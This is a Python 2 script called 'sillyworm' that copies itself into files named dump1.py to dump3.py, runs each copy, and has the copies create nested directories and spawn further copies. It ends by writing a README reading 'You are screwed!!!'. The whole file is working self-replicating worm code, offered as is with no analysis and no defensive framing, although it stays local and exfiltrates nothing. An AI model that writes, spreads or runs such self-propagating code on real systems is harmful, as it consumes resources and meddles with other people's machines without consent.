#!/usr/bin/python -

import os 
import thread
import sys
from subprocess import Popen

def main():
	if initialcheck():
		attack()
	else:
		initsetup()
                

def initsetup():
    with open('sillyworm.py') as f:
        sillyworm_contents = f.read()

    for i in range(1,4):
        filename = 'dump'+str(i)+'.py'
        with open(filename, 'w') as f:
            f.write(sillyworm_contents)
        Popen(['/usr/bin/python', os.path.dirname(os.path.abspath(__file__)) + "/" + filename]).pid
	
      
def attack():
        myfilename = os.path.basename(__file__)
	myfilename = myfilename.strip(".py")
	myfilenumber = int(myfilename.strip("dump"))
	with open(os.path.basename(__file__)) as f:
		file_contents = f.read()
	if myfilenumber != 4:
		os.makedirs(os.path.dirname(os.path.abspath(__file__))+"/"+myfilename)
		print "Created directory "+os.getcwd()+"/"+myfilename
		while myfilenumber != 3:
			childfilename = "dump"+str(myfilenumber+1)+".py"	
			with open(os.path.dirname(os.path.abspath(__file__)) + "/" + myfilename + "/" + childfilename, 'w') as f:
				f.write(file_contents)
			print "Created file "+myfilename+".py > ./"+myfilename+"/"+childfilename
			print "Trying to execute " + os.path.dirname(os.path.abspath(__file__)) + "/" + myfilename + "/" + childfilename
			myfilenumber += 1
			Popen(['/usr/bin/python', os.path.dirname(os.path.abspath(__file__)) + "/" + myfilename + "/" + childfilename]).pid
		
		if myfilenumber == 3 and str(myfilenumber) in os.path.basename(__file__):
			with open(os.path.dirname(os.path.abspath(__file__)) + "/" + myfilename + "/" + "README.md", 'w') as f:
				f.write("You are screwed!!!\n")		
	    			
def initialcheck():
        files = os.listdir(os.path.dirname(os.path.abspath(__file__)))
	for file in files:
		if "dump" in file:
			return True
	return False


if __name__ == "__main__":
	main()
